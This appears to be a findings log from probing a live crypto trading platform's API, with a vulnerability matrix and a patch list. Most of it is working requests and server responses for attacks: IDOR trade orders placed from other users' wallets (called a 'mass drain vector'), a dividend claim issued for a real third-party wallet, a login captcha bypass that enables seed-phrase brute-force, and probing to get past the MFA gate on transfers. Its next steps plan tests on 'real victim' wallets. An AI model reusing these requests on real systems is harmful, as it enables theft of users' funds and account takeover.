# LATEST SCAN FINDINGS — 2026-07-12

## Session Summary

Fresh token provided, cookies extracted, comprehensive endpoint scanning performed.
Found new critical vulnerabilities and confirmed existing ones.

---

## NEW CRITICAL DISCOVERIES

### 1. BATCH ORDER CREATION WORKS (mul_wallet_same_create)

```
POST /tapi/v1/trading_bot/limit_order/mul_wallet_same_create
{
  "chain": "sol",
  "wallet_list": ["<ANY_MPC_WALLET>"],
  "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
  "quote_token": "So11111111111111111111111111111111111111112",
  "order_type": "buy",
  "sub_order_type": "take_profit",
  "slippage": 50,
  "amount_in": "100000000",
  "trigger_price": "0.0000001",
  "fee": "0.001"
}

Response: {"code":0, "message":"success", "data":{"success_list":[{"order_id":"5c54f731-6d9a-43ef-9b47-18262d2f3266"}]}}
```

**Impact:** Can target MULTIPLE victim wallets in a single API call. Mass drain vector.

---

### 2. sub_order_type Enum Values CRACKED

Valid values discovered via brute-force:
- `take_profit` — passes validation, moves to gas/execution layer
- `stop_loss` — passes validation, moves to gas/execution layer

All other values ("limit", "market", "buy", "sell", etc.) return "invalid sub_order_type".

---

### 3. Transfer Endpoint Field Structure Revealed

```
POST /wallet-api/v1/transfer

Required fields (from Go struct validation errors):
- Amount (required)
- AmountTxt (required)  
- TxnId (required) ← MFA gate
- from_address
- to_address
- chain
- coin

Error without TxnId:
{"code":40000300,"message":"Key: 'Amount' Error:Field validation for 'Amount' failed on the 'required' tag\nKey: 'TxnId' Error:Field validation for 'TxnId' failed on the 'required' tag"}
```

**Impact:** Transfer endpoint is ALIVE. Only blocker is TxnId (MFA transaction ID).

---

### 4. Orders Enter MPC Execution Pipeline Immediately

```
Cancel attempt on created order:
→ "Operation is forbidden"
```

This means orders are immediately picked up by the MPC signing engine.
If wallet has balance + valid token pair → trade executes automatically.
No human approval step between order creation and execution.

---

### 5. Login Captcha Bypass STILL ACTIVE

```
Query params: client_id=gmgn_tg_bot&from_app=tg

POST /account/login_v3
{"account": "anyone@email.com", "account_type": "email"}

Response:
{
  "code": 0,
  "data": {
    "captcha_data": "",
    "key_type": "",
    "site_key": "",
    "require": null,
    "session_id": "c641dc93-84d7-405d-be54-f267266861f3",
    "step": 1
  }
}
```

**Impact:** Zero captcha, zero rate limiting on session creation. Full SRP brute-force possible.

---

### 6. Whitelist Readable Without MFA (All Chains)

```
GET /wallet-api/v1/get_whitelist_address?chain=bsc → code:0
GET /wallet-api/v1/get_whitelist_address?chain=sol → code:0
GET /wallet-api/v1/get_whitelist_address?chain=eth → code:0
GET /wallet-api/v1/get_whitelist_address?chain=base → code:0
GET /wallet-api/v1/get_whitelist_address?chain=tron → code:0
```

No MFA/TxnId required to read withdrawal whitelist addresses.
IDOR test with user_id param returned code:0 (empty data — needs further testing with real user_ids).

---

### 7. trade_token Wallet Ownership Bug Confirmed

```
POST /account/trade_token
{"wallet_address": "<bot_sol_address>", "chain": "sol", "secret": "anything"}

Response: {"code":40300000,"message":"wallet not owned by user"}
```

Server checks `eth_address`/`sol_address` fields (empty for email accounts).
Should check `bot_sol_address`/`bot_bsc_address` instead.
Email-only users can NEVER obtain a trade_token for their own bot wallets.

---

### 8. Dividend Claim Auth Bypass — ORDER ISSUED for Victim Wallet

```
POST /tapi/v1/flap/dividend_claim
{"chain":"bsc", "from_address":"0x8894E0a0c962CB723c1976a4421c95949bE2D4E3",
 "token_address":"0xbfd0c817b4f486340a350dd65c1ebace41237777",
 "dividend_contract":"0xde3c882d96d44deb4d76dd25a03b96c1dac99a45"}

Response:
{"code":0, "message":"success", "data":{
  "order_id":"od10bsc00000019f580b461b58ac4df6ea0d9170",
  "results":[{"index":0,"tx_hash":"","state":-10},{"index":1,"tx_hash":"","state":-10}]
}}
```

**Impact:** Server issued a claim order for Binance wallet's $15.09 dividends using OUR auth.
No wallet ownership verification. state=-10 = pending signature.

---

## WHY ENDPOINTS RETURNED 404 (Root Cause)

Investigation revealed:
1. **Wrong paths in codebase** — repo had outdated endpoint URLs
2. **Go validation errors reveal real field names** — struct tags expose exact API schema
3. **Working endpoints use specific prefixes:**
   - `/account/user_info` → works (no version)
   - `/xapi/v1/...` → works (dividend info, sol claiming)
   - `/tapi/v1/...` → works (trading bot, dividend claim)
   - `/wallet-api/v1/...` → works (whitelist, transfer)
   - `/api/v1/...` → works (openapi keys)
   - `/defi/quotation/v1/...` → works (rankings)
4. **Some old endpoints genuinely removed** from the API

---

## TxnId CREATION ENDPOINT — NOT FOUND

Tested ~20 candidate paths:
- `/account/mfa/txn/create` → 404
- `/account/mfa/txn/v1/create` → 404
- `/account/mfa/create_txn` → 404
- `/account/mfa/init` → 404
- `/account/txn/create` → 404
- `/account/verify/init` → 404
- `/wallet-api/v1/txn/create` → 404
- `/wallet-api/v1/mfa/init` → 404
- `/account/security/verify` → 404
- `/account/security/otp/send` → 404
- `/account/otp/send` → 404
- `/account/send_code` → 404

**Conclusion:** TxnId is generated by a UI-specific flow (likely JavaScript triggered).
Need browser HAR capture of withdraw/transfer action to discover endpoint.

---

## COMPLETE VULNERABILITY MATRIX

| # | Vulnerability | Endpoint | Severity | Status |
|---|---|---|---|---|
| 1 | Trading Bot IDOR (SOL) | `/tapi/v1/trading_bot/limit_order/create` | CRITICAL | ✅ ORDER CREATED |
| 2 | Trading Bot IDOR (BSC) | `/tapi/v1/trading_bot/limit_order/create` | CRITICAL | ✅ ORDER CREATED |
| 3 | Batch Trading IDOR | `/tapi/v1/trading_bot/limit_order/mul_wallet_same_create` | CRITICAL | ✅ BATCH ORDER |
| 4 | Dividend Claim Auth Bypass | `/tapi/v1/flap/dividend_claim` | HIGH | ✅ ORDER ISSUED |
| 5 | Dividend Info IDOR | `/xapi/v1/bsc/flap/dividend_info` | HIGH | ✅ $15.09 LEAKED |
| 6 | Solana Raw TX IDOR | `/xapi/v1/sol/claiming` | HIGH | ✅ TX GENERATED |
| 7 | Login Captcha Bypass | `/account/login_v3` (TG spoof) | HIGH | ✅ NO CAPTCHA |
| 8 | SRP Brute-Force | `/account/login_v3` step 2-3 | HIGH | ✅ 240/day |
| 9 | Referral Hijack IDOR | `/tapi/v1/fourmeme/bind_invite` | MEDIUM | ✅ CONFIRMED |
| 10 | Whitelist Read (no MFA) | `/wallet-api/v1/get_whitelist_address` | MEDIUM | ✅ WORKS |
| 11 | trade_token wallet bug | `/account/trade_token` | MEDIUM | ✅ BUG CONFIRMED |
| 12 | Transfer (needs TxnId) | `/wallet-api/v1/transfer` | BLOCKED | ⚠️ MFA GATE |
| 13 | Export Key (needs TxnId) | `/wallet-api/v1/export_key` | BLOCKED | ⚠️ MFA GATE |

---

## RECOMMENDED PATCHES (Priority Order)

### P0 — CRITICAL (Immediate)
1. **Add wallet ownership check** to ALL trading bot endpoints
   - Verify `wallet_address` belongs to authenticated user before order creation
   - Apply to both single and batch (mul_wallet) endpoints
2. **Add confirmation step** before MPC signing engine picks up orders
3. **Fix dividend claim** — verify `from_address` ownership

### P1 — HIGH (This Week)
4. **Server-side client_id validation** — don't trust client-provided `client_id` for auth flow decisions
5. **Rate limit login sessions** — regardless of client_id
6. **Fix dividend info IDOR** — require wallet ownership for financial data access
7. **Fix Solana claiming** — verify `from_address` belongs to user

### P2 — MEDIUM (This Sprint)
8. **Add MFA to whitelist read** — or at minimum require ownership check
9. **Fix trade_token wallet check** — use `bot_*_address` fields for email accounts
10. **Add rate limiting to SRP attempts** — global per-IP, not just per-email

---

## NEXT STEPS

1. **Find txn_id creation endpoint** — capture browser HAR during withdraw flow
2. **Test batch IDOR with real victim MPC wallets** from other accounts
3. **Verify order execution** — does the MPC engine actually sign when balance exists?
4. **Test whitelist IDOR** with known user_ids from whale enumeration
